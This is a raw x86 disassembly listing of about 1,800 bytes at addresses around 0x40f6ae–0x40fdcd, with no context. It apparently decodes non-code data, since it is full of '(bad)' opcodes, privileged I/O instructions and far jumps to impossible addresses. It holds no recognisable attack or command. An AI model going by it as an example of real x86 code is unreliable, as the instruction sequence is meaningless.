  40f6ae:	fild   DWORD PTR [ebx-0x77]
  40f6b1:	sti    
  40f6b2:	or     eax,0xb160897d
  40f6b7:	popf   
  40f6b8:	nop
  40f6b9:	aaa    
  40f6ba:	mov    bl,0x58
  40f6bc:	mov    eax,0x1df1e4b2
  40f6c1:	ss nop
  40f6c3:	imul   esp,ebx,0xffffff87
  40f6c6:	fdivr  DWORD PTR [esi]
  40f6c8:	adc    ch,BYTE PTR [edx]
  40f6ca:	outs   dx,DWORD PTR ds:[esi]
  40f6cb:	leave  
  40f6cc:	pop    eax
  40f6cd:	jmp    0x40f6c3
  40f6cf:	cmp    BYTE PTR [edi+0x47abb8f1],ch
  40f6d5:	push   0xffffff85
  40f6d7:	adc    DWORD PTR [eax-0x4cf3a21d],ebx
  40f6dd:	xor    BYTE PTR [esi+0x21],bl
  40f6e0:	loope  0x40f710
  40f6e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6e3:	xor    ebp,DWORD PTR [ecx-0x25f1f107]
  40f6e9:	or     al,0xcb
  40f6eb:	mov    al,ds:0xd2fc04e9
  40f6f0:	push   ecx
  40f6f1:	nop
  40f6f2:	add    DWORD PTR [ebx+0x51e81cb8],ebx
  40f6f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6f9:	push   ds
  40f6fa:	push   esp
  40f6fb:	xor    eax,0x38d38fa1
  40f700:	inc    esp
  40f701:	jecxz  0x40f712
  40f703:	push   es
  40f704:	out    dx,al
  40f705:	xsavec ds:0xfb147456
  40f70c:	lea    edx,[edi]
  40f70e:	inc    eax
  40f70f:	imul   esi,DWORD PTR [eax+0x41126081],0x42
  40f716:	add    BYTE PTR ds:[edi-0x4e],al
  40f71a:	mov    ebx,0xcbfeb6c9
  40f71f:	push   eax
  40f720:	call   0x10ea:0x72979cc3
  40f727:	scas   eax,DWORD PTR es:[edi]
  40f728:	xlat   BYTE PTR ds:[ebx]
  40f729:	lahf   
  40f72a:	mov    dl,0x87
  40f72c:	inc    edx
  40f72d:	mov    cl,BYTE PTR [edi-0x25]
  40f730:	test   eax,0x2cbc0e7f
  40f735:	imul   ebx,DWORD PTR [eax+eiz*8-0x51457413],0x21
  40f73d:	rol    DWORD PTR [edi-0x3f],cl
  40f740:	jmp    0x8e5fbb57
  40f745:	stc    
  40f746:	mov    al,ds:0xcce0a6d7
  40f74b:	popf   
  40f74c:	in     eax,0xe0
  40f74e:	xor    DWORD PTR [ebp+0x29],edi
  40f751:	jne    0x40f6fc
  40f753:	outs   dx,BYTE PTR ds:[esi]
  40f754:	or     bh,bl
  40f756:	jne    0x40f736
  40f758:	xchg   edx,eax
  40f759:	cmp    esp,ecx
  40f75b:	xchg   ecx,eax
  40f75c:	pop    DWORD PTR [ecx+0x462086c8]
  40f762:	rcl    BYTE PTR [esi+0x3],1
  40f765:	pop    ebx
  40f766:	xor    ebp,ecx
  40f768:	pmaddwd mm3,mm7
  40f76b:	push   0xffffffed
  40f76d:	push   edx
  40f76e:	ret    0xaaf8
  40f771:	mov    eax,0x8c9a33dc
  40f776:	add    BYTE PTR [ecx+ecx*8+0x1f5b4874],dl
  40f77d:	lock mov dh,0x1d
  40f780:	cdq    
  40f781:	jno    0x40f7bd
  40f783:	dec    eax
  40f784:	ja     0x40f715
  40f786:	and    dh,BYTE PTR [ebx+ecx*4]
  40f789:	shl    ebx,cl
  40f78b:	jne    0x40f80c
  40f78d:	scas   al,BYTE PTR es:[edi]
  40f78e:	shl    BYTE PTR [edx],1
  40f790:	dec    ebp
  40f791:	adc    eax,0xc7aefc10
  40f796:	push   cs
  40f797:	mov    al,0xcd
  40f799:	push   ss
  40f79a:	xor    al,BYTE PTR [edi]
  40f79c:	xchg   ebp,eax
  40f79d:	mov    ebx,0xb2970985
  40f7a2:	mov    ebx,0x391c05f9
  40f7a7:	lods   al,BYTE PTR ds:[esi]
  40f7a8:	(bad)  
  40f7a9:	fidivr WORD PTR ds:0x2af01084
  40f7af:	sbb    ah,cl
  40f7b1:	(bad)
  40f7b5:	mov    WORD PTR [ebx-0x2],fs
  40f7b8:	stos   DWORD PTR es:[edi],eax
  40f7b9:	repz bound ecx,QWORD PTR [edx]
  40f7bc:	mov    edx,0x433e57c5
  40f7c1:	outs   dx,DWORD PTR ds:[esi]
  40f7c2:	sub    BYTE PTR [ecx],bl
  40f7c4:	add    edx,DWORD PTR [esi-0x2fa0037e]
  40f7ca:	cmp    cl,BYTE PTR [edi+edx*1+0x4be5c6de]
  40f7d1:	pop    edx
  40f7d2:	xchg   ecx,eax
  40f7d3:	mov    DWORD PTR [ebx+0x54271220],ecx
  40f7d9:	popa   
  40f7da:	push   es
  40f7db:	(bad)  
  40f7dc:	mov    BYTE PTR ds:0xc5be3589,bh
  40f7e2:	jge    0x40f798
  40f7e4:	sbb    edi,DWORD PTR [ecx-0x14]
  40f7e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7e8:	cld    
  40f7e9:	aaa    
  40f7ea:	pusha  
  40f7eb:	dec    esp
  40f7ec:	jp     0x40f81d
  40f7ee:	xchg   esp,eax
  40f7ef:	test   BYTE PTR [eax],dl
  40f7f1:	movq   QWORD PTR [ebx],mm1
  40f7f4:	in     eax,dx
  40f7f5:	jmp    0x40f7e1
  40f7f7:	fdivrp st(7),st
  40f7f9:	add    eax,0x7f2b2897
  40f7fe:	ret    
  40f7ff:	and    eax,0x7192f40d
  40f804:	gs (bad) 
  40f806:	fild   WORD PTR [ecx+ebp*1-0x3d]
  40f80a:	iret   
  40f80b:	mov    al,0xb6
  40f80d:	adc    DWORD PTR [esp+eiz*2],esp
  40f810:	dec    edi
  40f811:	repnz ror DWORD PTR [edi-0xa571cd0],cl
  40f818:	pop    esp
  40f819:	lahf   
  40f81a:	sbb    bl,dh
  40f81c:	dec    edx
  40f81d:	cmp    al,0x2a
  40f81f:	cmc    
  40f820:	out    0x9,eax
  40f822:	aaa    
  40f823:	adc    BYTE PTR [ebp+0x2609d7f1],al
  40f829:	rcr    cl,cl
  40f82b:	das    
  40f82c:	jmp    0x7c10323e
  40f831:	test   BYTE PTR [edi],0x83
  40f834:	mov    bl,0xf4
  40f836:	mov    esp,0x221bcae7
  40f83b:	loope  0x40f7f5
  40f83d:	outs   dx,BYTE PTR ds:[esi]
  40f83e:	fstp   DWORD PTR [edx]
  40f840:	in     eax,dx
  40f841:	push   0xfb6e94dd
  40f846:	jns    0x40f7c8
  40f848:	mov    BYTE PTR [edx+eiz*1+0x19c9e1c2],bl
  40f84f:	adc    al,0x64
  40f851:	xchg   BYTE PTR [esi-0x63],al
  40f854:	push   edx
  40f855:	in     eax,dx
  40f856:	cmp    al,0x35
  40f858:	xor    dh,ah
  40f85a:	adc    BYTE PTR [eax+0x5a9246ae],bh
  40f860:	fmul   DWORD PTR [esi+0x6e2576c4]
  40f866:	cmp    DWORD PTR [esi-0x3d94f063],ebx
  40f86c:	fnsave [esp+edx*2]
  40f86f:	inc    esi
  40f870:	add    BYTE PTR [edi],dh
  40f872:	or     bh,bh
  40f874:	sti    
  40f875:	jp     0x40f8ba
  40f877:	ins    DWORD PTR es:[edi],dx
  40f878:	cmp    esp,edx
  40f87a:	pop    edx
  40f87b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f87c:	inc    esp
  40f87d:	stos   BYTE PTR es:[edi],al
  40f87e:	xchg   ebp,eax
  40f87f:	ffreep st(4)
  40f881:	mov    dh,0x28
  40f883:	inc    ecx
  40f884:	mov    edi,0xc527d0e
  40f889:	adc    ecx,DWORD PTR [ebp+ebp*2-0x67199b62]
  40f890:	call   0xf9165189
  40f895:	jmp    0x40f888
  40f897:	imul   edi,DWORD PTR ds:0x4b5ba749,0xffffffd3
  40f89e:	imul   ebp,DWORD PTR [edx+ebp*2],0xffffffbd
  40f8a2:	adc    eax,0xaf4616c8
  40f8a7:	cmp    ecx,DWORD PTR ds:0x58a19ae2
  40f8ad:	in     eax,0x4c
  40f8af:	fstp   TBYTE PTR ds:0xd7615761
  40f8b5:	xchg   esi,eax
  40f8b6:	push   esi
  40f8b7:	loop   0x40f92e
  40f8b9:	dec    ebp
  40f8ba:	xor    al,0x6b
  40f8bc:	icebp  
  40f8bd:	(bad)  
  40f8be:	jge    0x40f90a
  40f8c0:	fisttp QWORD PTR [ebx+0x2ccddf95]
  40f8c6:	cli    
  40f8c7:	mov    dh,0xed
  40f8c9:	(bad)  
  40f8ca:	jmp    0xfdc8:0x50e8fa5f
  40f8d1:	xchg   BYTE PTR [ebx+0x2504a3dc],bl
  40f8d7:	test   BYTE PTR [ebp+ebp*1-0x38],bl
  40f8db:	cmp    eax,0xb16066b7
  40f8e0:	push   edi
  40f8e1:	xchg   ebp,eax
  40f8e2:	mov    esi,edx
  40f8e4:	pop    es
  40f8e5:	dec    esi
  40f8e6:	(bad)  
  40f8e7:	pop    esi
  40f8e8:	jp     0x40f88d
  40f8ea:	addr16 (bad) 
  40f8ec:	or     BYTE PTR [ebx],bl
  40f8ee:	retf   
  40f8ef:	dec    edi
  40f8f0:	jno    0x40f8a8
  40f8f2:	inc    edi
  40f8f3:	xlat   BYTE PTR ds:[ebx]
  40f8f4:	stos   BYTE PTR es:[edi],al
  40f8f5:	sbb    dh,BYTE PTR [ebx]
  40f8f7:	sahf   
  40f8f8:	cli    
  40f8f9:	mov    WORD PTR [esp+ebp*1],fs
  40f8fc:	pop    ss
  40f8fd:	sbb    dh,BYTE PTR [edi+0x1d5ea44d]
  40f903:	mov    al,ds:0x9fdea09c
  40f908:	fild   QWORD PTR [edi-0x22]
  40f90b:	sub    cl,BYTE PTR [esi]
  40f90d:	sbb    esi,edi
  40f90f:	mov    edx,0xc8db15d8
  40f914:	scas   al,BYTE PTR es:[edi]
  40f915:	mov    cl,0x3d
  40f917:	jbe    0x40f8c7
  40f919:	dec    ebp
  40f91b:	bswap  ebx
  40f91d:	aam    0xab
  40f91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f920:	mov    ebp,DWORD PTR [esi-0x5196a5cb]
  40f926:	aad    0x58
  40f928:	jmp    0x40f904
  40f92a:	mov    DWORD PTR [edi-0x18],0x3f2af618
  40f931:	xchg   esi,eax
  40f932:	fidivr DWORD PTR [ebx-0x68]
  40f935:	outs   dx,DWORD PTR ds:[esi]
  40f936:	hlt    
  40f937:	push   edi
  40f938:	in     eax,dx
  40f939:	pop    eax
  40f93a:	in     eax,dx
  40f93b:	sbb    cl,BYTE PTR [edi-0x18]
  40f93e:	cwde   
  40f93f:	xchg   ebp,eax
  40f940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f941:	push   esi
  40f942:	pop    ebp
  40f943:	repz sar BYTE PTR [edi],1
  40f946:	outs   dx,BYTE PTR ss:[esi]
  40f948:	jne    0x40f911
  40f94a:	in     eax,dx
  40f94b:	add    DWORD PTR [ebx+ebp*8],edi
  40f94e:	cmp    edx,ebp
  40f950:	sbb    bh,BYTE PTR [edx-0x5b]
  40f953:	push   esp
  40f954:	adc    eax,0x638b59e
  40f959:	scas   al,BYTE PTR es:[edi]
  40f95a:	jo     0x40f9d2
  40f95c:	fwait
  40f95d:	rcl    DWORD PTR [ebp+ebx*8-0x2c],1
  40f961:	adc    al,al
  40f963:	sbb    DWORD PTR [edi],edi
  40f965:	aaa    
  40f966:	xchg   ecx,eax
  40f967:	sbb    al,0x18
  40f969:	ja     0x40f9b2
  40f96b:	or     edx,DWORD PTR [ecx-0xd]
  40f96e:	ror    BYTE PTR [esi+0x319fe918],0x76
  40f975:	push   ecx
  40f976:	push   esi
  40f977:	pop    edi
  40f978:	shr    DWORD PTR [eax+0x3f],1
  40f97b:	mov    ds:0x34ac27a6,al
  40f980:	mov    bh,0xdd
  40f982:	fbld   TBYTE PTR [ebx+0x92e5054]
  40f988:	scas   al,BYTE PTR es:[edi]
  40f989:	xchg   edx,eax
  40f98a:	add    BYTE PTR [edx],dl
  40f98c:	out    0xb2,al
  40f98e:	jmp    0x40f9e4
  40f990:	add    eax,0x89a699a2
  40f995:	mov    edi,0xb36dff37
  40f99a:	int    0xbd
  40f99c:	cmp    DWORD PTR [eax],ebp
  40f99e:	in     al,dx
  40f99f:	pop    ecx
  40f9a0:	retf   0xc350
  40f9a3:	mov    bl,0xfb
  40f9a5:	retf   0x1a28
  40f9a8:	aam    0xaa
  40f9aa:	fnstsw WORD PTR [ecx+esi*1]
  40f9ad:	xchg   edi,eax
  40f9ae:	cmp    al,0x5e
  40f9b0:	mov    DWORD PTR [ecx+edx*2],ecx
  40f9b3:	pop    ds
  40f9b4:	and    ecx,DWORD PTR [edx+0x59]
  40f9b7:	or     DWORD PTR [edx],edx
  40f9b9:	dec    edx
  40f9ba:	mov    ebx,0x6ecccc05
  40f9bf:	fld    TBYTE PTR [esi-0x4c]
  40f9c2:	cmp    ebp,esi
  40f9c4:	xor    cl,BYTE PTR [ebp+0x62697c70]
  40f9ca:	imul   ecx,DWORD PTR [esi+0x15],0xdac268f
  40f9d1:	rcl    DWORD PTR [edx],cl
  40f9d3:	rcr    DWORD PTR [edx-0x13509fc],cl
  40f9d9:	jmp    0x2d1d:0x8882a7b4
  40f9e0:	cmp    edi,DWORD PTR [edx-0x1d]
  40f9e3:	lods   al,BYTE PTR ds:[esi]
  40f9e4:	shr    BYTE PTR [esi-0x24],0x8c
  40f9e8:	sbb    DWORD PTR [eax+edx*1],eax
  40f9eb:	ret    0x1509
  40f9ee:	sbb    BYTE PTR [edi+0x7],bh
  40f9f1:	or     eax,0x1d64d74c
  40f9f6:	ins    DWORD PTR es:[edi],dx
  40f9f7:	push   ebp
  40f9f8:	addr16 dec edi
  40f9fa:	jp     0x40fa00
  40f9fc:	mov    ds:0xa9d1e3c0,eax
  40fa01:	pop    ebp
  40fa02:	scas   al,BYTE PTR es:[edi]
  40fa03:	popa   
  40fa04:	dec    edi
  40fa05:	xor    DWORD PTR [edi+0x47],edi
  40fa08:	popf   
  40fa09:	adc    DWORD PTR [eax],ebx
  40fa0b:	xor    al,0x59
  40fa0d:	push   eax
  40fa0e:	jge    0x40fa60
  40fa10:	shr    DWORD PTR [ebx+0x1f],0xe8
  40fa14:	xor    al,0x92
  40fa16:	call   0xac7d:0xc237ef0d
  40fa1d:	mov    ds:0x6f4cafbb,al
  40fa22:	inc    edx
  40fa23:	cld    
  40fa24:	dec    edx
  40fa25:	fist   WORD PTR [esp+eiz*8+0x45adf627]
  40fa2c:	lods   eax,DWORD PTR ds:[esi]
  40fa2d:	in     al,0x91
  40fa2f:	push   ds
  40fa30:	or     al,0x44
  40fa32:	sbb    BYTE PTR [eax],al
  40fa34:	inc    ebx
  40fa35:	imul   DWORD PTR [ecx-0x1]
  40fa38:	pop    ebx
  40fa39:	scas   eax,DWORD PTR es:[edi]
  40fa3a:	ja     0x40fa42
  40fa3c:	cwde   
  40fa3d:	fs inc edx
  40fa3f:	xchg   ebx,eax
  40fa40:	mov    al,0xcc
  40fa42:	sub    eax,0x6aa22e0a
  40fa47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa48:	mov    fs,WORD PTR [edi+0x4b]
  40fa4b:	xchg   ebp,eax
  40fa4c:	popa   
  40fa4d:	mov    BYTE PTR [eax+0x6c],ah
  40fa50:	adc    BYTE PTR [ebp-0x65c80665],ch
  40fa56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa57:	or     esi,edi
  40fa59:	push   ds
  40fa5a:	xor    esi,edi
  40fa5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa5d:	lods   al,BYTE PTR ds:[esi]
  40fa5e:	sub    esi,DWORD PTR [ebx+ebp*8]
  40fa61:	sub    eax,0x6e43041b
  40fa66:	mov    ch,0x9c
  40fa68:	xor    al,0xeb
  40fa6a:	mov    ecx,0xbc67a23b
  40fa6f:	sbb    esp,DWORD PTR [ecx-0x11]
  40fa72:	dec    edi
  40fa73:	or     esi,edx
  40fa75:	in     al,0xbf
  40fa77:	(bad)  
  40fa78:	xlat   BYTE PTR ds:[ebx]
  40fa79:	repz jae 0x40fac7
  40fa7c:	sbb    cl,ch
  40fa7e:	(bad)  
  40fa7f:	fld    DWORD PTR [ebp-0x2e]
  40fa82:	cwde   
  40fa83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa84:	sbb    esp,ecx
  40fa86:	inc    ebx
  40fa87:	lahf   
  40fa88:	sub    ecx,eax
  40fa8a:	ficomp WORD PTR [esi]
  40fa8c:	sbb    bh,ah
  40fa8e:	mov    ah,0x8f
  40fa90:	repnz push esp
  40fa92:	mov    bh,0x84
  40fa94:	mov    al,ds:0x2bac03a0
  40fa99:	mov    bl,0x40
  40fa9b:	cmp    bh,BYTE PTR [esi-0x63a3aaf2]
  40faa1:	inc    esi
  40faa3:	adc    ecx,DWORD PTR [bp+si]
  40faa6:	outs   dx,BYTE PTR ds:[esi]
  40faa7:	test   eax,0x8c87680b
  40faac:	or     ecx,DWORD PTR [eax]
  40faae:	cmc    
  40faaf:	xchg   esp,eax
  40fab0:	pop    esi
  40fab1:	lahf   
  40fab2:	in     eax,dx
  40fab3:	daa    
  40fab4:	or     eax,0x5da3a929
  40fab9:	dec    ebx
  40faba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fabb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fabc:	dec    eax
  40fabd:	fcom   DWORD PTR [edx-0x1935a6e9]
  40fac3:	xchg   DWORD PTR [ebp-0x1b],eax
  40fac6:	rcl    DWORD PTR [ebp-0x680cbe48],0x60
  40facd:	mov    eax,0xf9ab5af2
  40fad2:	in     eax,0xab
  40fad4:	loope  0x40fa93
  40fad6:	out    0x6f,al
  40fad8:	xchg   edi,eax
  40fad9:	mov    cl,0xc
  40fadb:	adc    esp,edi
  40fadd:	jae    0x40fada
  40fadf:	ret    0x9fbb
  40fae2:	add    DWORD PTR [ecx],ecx
  40fae4:	sbb    DWORD PTR [eax],esp
  40fae6:	jbe    0x40fac4
  40fae8:	jmp    0x118a3fa6
  40faed:	inc    esi
  40faee:	scas   al,BYTE PTR es:[edi]
  40faef:	or     DWORD PTR [ebx],ebx
  40faf1:	and    DWORD PTR [ebp+edx*8+0xa],ebx
  40faf5:	mov    eax,0x7a198933
  40fafa:	sub    al,0x15
  40fafc:	clc    
  40fafd:	into   
  40fafe:	shr    BYTE PTR [ecx-0x4d1a8ccf],1
  40fb04:	inc    edi
  40fb05:	in     eax,dx
  40fb06:	mov    ss,ebp
  40fb08:	in     eax,0x6
  40fb0a:	lahf   
  40fb0b:	ret    0x6e22
  40fb0e:	ror    BYTE PTR [edx-0x7247bbf2],0x30
  40fb15:	(bad)  
  40fb16:	addr16 xchg esi,eax
  40fb18:	stc    
  40fb19:	pusha  
  40fb1a:	sahf   
  40fb1b:	adc    dl,ch
  40fb1d:	int    0x1e
  40fb1f:	sbb    eax,0x186fa0c
  40fb24:	rol    DWORD PTR fs:[ebp-0x691f812c],0xba
  40fb2c:	xchg   BYTE PTR [ecx+eiz*4],cl
  40fb2f:	retf   0xfbac
  40fb32:	lods   al,BYTE PTR ds:[esi]
  40fb33:	or     al,0xbf
  40fb35:	inc    ebp
  40fb36:	add    DWORD PTR [esi-0x8],ebp
  40fb39:	les    ebp,FWORD PTR [esi]
  40fb3b:	int3   
  40fb3c:	out    dx,eax
  40fb3d:	fldcw  WORD PTR [edx]
  40fb3f:	cs jnp 0x40fae4
  40fb42:	ja     0x40fbad
  40fb44:	ja     0x40fb8e
  40fb46:	xchg   esi,eax
  40fb47:	xor    al,0xf3
  40fb49:	cmp    esi,esp
  40fb4b:	or     dh,cl
  40fb4d:	ds pushf 
  40fb4f:	pop    esp
  40fb50:	pop    ebp
  40fb51:	mov    ecx,0x48699ec7
  40fb56:	sti    
  40fb57:	lahf   
  40fb58:	stos   DWORD PTR es:[edi],eax
  40fb59:	call   0xe0cc212e
  40fb5e:	dec    ebx
  40fb5f:	data16 fucomi st,st(5)
  40fb62:	jne    0x40fbaf
  40fb64:	adc    BYTE PTR [ebx+0x6c],ah
  40fb67:	push   ds
  40fb68:	cs jmp 0x40fb9a
  40fb6b:	pop    ds
  40fb6c:	inc    eax
  40fb6d:	xchg   edx,eax
  40fb6e:	dec    edx
  40fb6f:	sub    edi,DWORD PTR [ecx-0x281aa09f]
  40fb75:	fwait
  40fb76:	sbb    BYTE PTR [edi-0x5f9b0fb0],bh
  40fb7c:	inc    eax
  40fb7d:	adc    BYTE PTR [edi],0x55
  40fb80:	mov    cl,0x49
  40fb82:	loopne 0x40fbd8
  40fb84:	lods   eax,DWORD PTR ds:[esi]
  40fb85:	shl    BYTE PTR ds:0xa33d826c,1
  40fb8b:	pushf  
  40fb8c:	push   ecx
  40fb8d:	jle    0x40fb6d
  40fb8f:	lods   eax,DWORD PTR ds:[esi]
  40fb90:	pop    ebp
  40fb91:	pop    esi
  40fb92:	retf   0x8df8
  40fb95:	jb     0x40fb52
  40fb97:	jno    0x40fbb1
  40fb99:	push   ss
  40fb9a:	fstp   st(3)
  40fb9c:	clc    
  40fb9d:	out    dx,eax
  40fb9e:	cmp    ecx,DWORD PTR [ecx+0x64]
  40fba1:	loop   0x40fbb5
  40fba3:	ret    
  40fba4:	mov    ds:0xf906b18,eax
  40fba9:	cmp    esp,DWORD PTR [ecx-0x12]
  40fbac:	dec    ecx
  40fbad:	fs call 0xbe0f:0x7ca413dc
  40fbb5:	cmc    
  40fbb6:	(bad)  
  40fbb7:	popa   
  40fbb8:	pop    ds
  40fbb9:	jo     0x40fbcf
  40fbbb:	int3   
  40fbbc:	xchg   esi,eax
  40fbbd:	stos   BYTE PTR es:[edi],al
  40fbbe:	and    esp,ecx
  40fbc0:	add    al,0x13
  40fbc2:	fldl2e 
  40fbc4:	sub    bl,BYTE PTR [edi-0x56ca6476]
  40fbca:	imul   BYTE PTR [ebx-0x795de916]
  40fbd0:	push   ebp
  40fbd1:	or     BYTE PTR [ecx-0x663c0d81],0x6c
  40fbd8:	xchg   edi,eax
  40fbd9:	cmp    edi,DWORD PTR [edx+0x6a58d632]
  40fbdf:	fs mov ecx,edx
  40fbe2:	fs dec esi
  40fbe4:	dec    edi
  40fbe5:	xor    BYTE PTR [ecx],bl
  40fbe7:	jbe    0x40fbef
  40fbe9:	pop    ecx
  40fbea:	imul   ebx,DWORD PTR [edx-0x50],0xfffffffd
  40fbee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbef:	arpl   WORD PTR ss:0x46a8f592,si
  40fbf6:	in     eax,0xa3
  40fbf8:	pop    esp
  40fbf9:	lock div BYTE PTR [ecx-0x1f1e9e54]
  40fc00:	sbb    esi,DWORD PTR [esp+eax*4]
  40fc03:	push   edx
  40fc04:	push   0xfffffffd
  40fc06:	xor    eax,DWORD PTR [ebx-0x5f]
  40fc09:	sbb    BYTE PTR [esi],al
  40fc0b:	cwde   
  40fc0c:	fstp   DWORD PTR [eax+0x45370087]
  40fc12:	xor    bh,al
  40fc14:	jle    0x40fc5a
  40fc16:	push   es
  40fc17:	sysenter 
  40fc19:	add    eax,0x8733b84e
  40fc1e:	sub    DWORD PTR [ecx],edi
  40fc20:	leave  
  40fc21:	and    esi,ebp
  40fc23:	inc    esi
  40fc24:	add    esp,DWORD PTR [edi-0x75]
  40fc27:	aad    0x6a
  40fc29:	dec    ebp
  40fc2a:	ds sahf 
  40fc2c:	iret   
  40fc2d:	jmp    0x38d16608
  40fc32:	jle    0x40fbf8
  40fc34:	adc    edx,DWORD PTR [edx-0x17]
  40fc37:	push   ecx
  40fc38:	mov    ecx,DWORD PTR [ebp+0x4282cd90]
  40fc3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc3f:	inc    esp
  40fc40:	cmp    BYTE PTR [edi-0xb],0x2d
  40fc44:	xor    BYTE PTR [ebp+0x66cf5f6a],ch
  40fc4a:	jcxz   0x40fcaf
  40fc4d:	fld    TBYTE PTR [edi+0x26af8466]
  40fc53:	and    eax,0x3153a42a
  40fc58:	arpl   WORD PTR [esi],si
  40fc5a:	xor    eax,0xcb0fb361
  40fc5f:	mov    cl,BYTE PTR [edi]
  40fc61:	and    DWORD PTR [ecx+0x12],0xffffffb2
  40fc65:	call   0xc98e:0x8f0b2979
  40fc6c:	push   0x6e56fdde
  40fc71:	inc    edi
  40fc72:	js     0x40fcdc
  40fc74:	(bad)  
  40fc75:	pop    esi
  40fc76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc77:	xchg   ecx,eax
  40fc78:	test   eax,0x152578d2
  40fc7d:	mov    DWORD PTR [ebp+0x40],edx
  40fc80:	sar    BYTE PTR [edx-0x26b55d03],0xd0
  40fc87:	call   0x1bb6:0xfa233370
  40fc8e:	cmp    ah,dh
  40fc90:	les    edi,FWORD PTR [edi+0x74]
  40fc93:	in     eax,dx
  40fc94:	xor    DWORD PTR [esi+0x6a5ac82b],eax
  40fc9a:	mov    bh,0x5e
  40fc9c:	or     eax,0x62088fe7
  40fca1:	shr    DWORD PTR [ebp-0x1a82d5a6],0x2a
  40fca8:	sbb    DWORD PTR [eax+ecx*8],ebx
  40fcab:	ins    DWORD PTR es:[edi],dx
  40fcac:	and    ch,bl
  40fcae:	jecxz  0x40fc4c
  40fcb0:	ror    BYTE PTR [esi-0x7d59bc9a],cl
  40fcb6:	ret    0xbbaa
  40fcb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcba:	or     bl,BYTE PTR [ebp+edi*4+0x43]
  40fcbe:	stc    
  40fcbf:	mov    esi,0xef9c330e
  40fcc4:	adc    dl,dl
  40fcc6:	leave  
  40fcc7:	sub    DWORD PTR [eax+0x709839e7],esp
  40fccd:	xor    ebp,DWORD PTR [esi+esi*8]
  40fcd0:	js     0x40fc53
  40fcd2:	push   ebp
  40fcd3:	push   cs
  40fcd4:	imul   esp,DWORD PTR [ecx-0x7374ff3c],0xffffffca
  40fcdb:	sub    esp,0x7e0eea48
  40fce1:	jmp    0x40fd55
  40fce3:	mov    esp,0xf1d2d32b
  40fce8:	popf   
  40fce9:	xor    ebp,DWORD PTR [edx-0x67116862]
  40fcef:	cmc    
  40fcf0:	ret    
  40fcf1:	jg     0x40fcd9
  40fcf3:	cld    
  40fcf4:	push   ecx
  40fcf5:	retf   
  40fcf6:	test   al,0xd0
  40fcf8:	fbld   TBYTE PTR [eax-0x3f]
  40fcfb:	aaa    
  40fcfc:	dec    ebx
  40fcfd:	push   0x27f50b1a
  40fd02:	imul   DWORD PTR [edi-0x6ca02f99]
  40fd08:	out    dx,al
  40fd09:	call   0x16e4dbfc
  40fd0e:	je     0x40fd81
  40fd10:	inc    eax
  40fd11:	ss inc eax
  40fd13:	pop    esi
  40fd14:	push   0x59
  40fd16:	inc    esi
  40fd17:	in     al,dx
  40fd18:	cmp    edx,edi
  40fd1a:	add    BYTE PTR [ecx-0x7b0c97f4],al
  40fd20:	mov    edx,0xad6c0615
  40fd25:	push   esi
  40fd26:	scas   al,BYTE PTR es:[edi]
  40fd27:	repnz sti 
  40fd29:	dec    ecx
  40fd2a:	loope  0x40fd2a
  40fd2c:	jmp    DWORD PTR [ebx+eiz*2-0x31]
  40fd30:	dec    esi
  40fd31:	enter  0x1af6,0x18
  40fd35:	into   
  40fd36:	push   edi
  40fd37:	pusha  
  40fd38:	mov    ch,0xb6
  40fd3a:	sbb    DWORD PTR [ecx+0x46],0xffffffde
  40fd3e:	and    BYTE PTR [eax+0x15],al
  40fd41:	(bad)  
  40fd42:	jecxz  0x40fcff
  40fd44:	cmp    al,0x84
  40fd46:	and    ecx,DWORD PTR [edi-0x65bbba7f]
  40fd4c:	xor    edi,edi
  40fd4e:	mov    edi,0x806efbfa
  40fd53:	fidivr WORD PTR [esi+0x12]
  40fd56:	sub    DWORD PTR [esp+ecx*1],eax
  40fd59:	sbb    DWORD PTR [ebx+edx*8+0x5ba5d84d],esi
  40fd60:	int    0xd1
  40fd62:	shl    ah,0xcf
  40fd65:	cmovns edi,eax
  40fd68:	mov    DWORD PTR [ebp-0x53cbb66],ebp
  40fd6e:	rcr    dh,cl
  40fd70:	rol    BYTE PTR [esp+ebx*1],1
  40fd73:	add    ch,BYTE PTR [ebx]
  40fd75:	aas    
  40fd76:	xchg   edx,eax
  40fd77:	mov    ds,WORD PTR [esi+0x3b]
  40fd7a:	mov    edi,ecx
  40fd7c:	or     al,0xa3
  40fd7e:	pushf  
  40fd7f:	mov    al,0xf5
  40fd81:	adc    eax,0x34507350
  40fd86:	push   ds
  40fd87:	mov    eax,0x77856603
  40fd8c:	test   eax,0x8352f9b9
  40fd91:	nop
  40fd92:	ret    0xe654
  40fd95:	hlt    
  40fd96:	(bad)  
  40fd97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd98:	call   0x89ae:0xc7e81d87
  40fd9f:	cld    
  40fda0:	aam    0x8e
  40fda2:	imul   ecx,DWORD PTR [esi],0x7993614f
  40fda8:	pop    ecx
  40fda9:	or     ebp,DWORD PTR [esi]
  40fdab:	xor    ebp,DWORD PTR [eax+0x21]
  40fdae:	scas   eax,DWORD PTR es:[edi]
  40fdaf:	test   BYTE PTR [eax],bl
  40fdb1:	(bad)  
  40fdb2:	je     0x40fdfc
  40fdb4:	sbb    BYTE PTR [ecx+ebx*8+0x27bb1a2a],bl
  40fdbb:	sti    
  40fdbc:	mov    bl,BYTE PTR [ebp+edi*4-0x3f992195]
  40fdc3:	stos   DWORD PTR es:[edi],eax
  40fdc4:	xor    edx,0xffffffdc
  40fdc7:	into   
  40fdc8:	call   0x213a248c
  40fdcd:	push   ebp
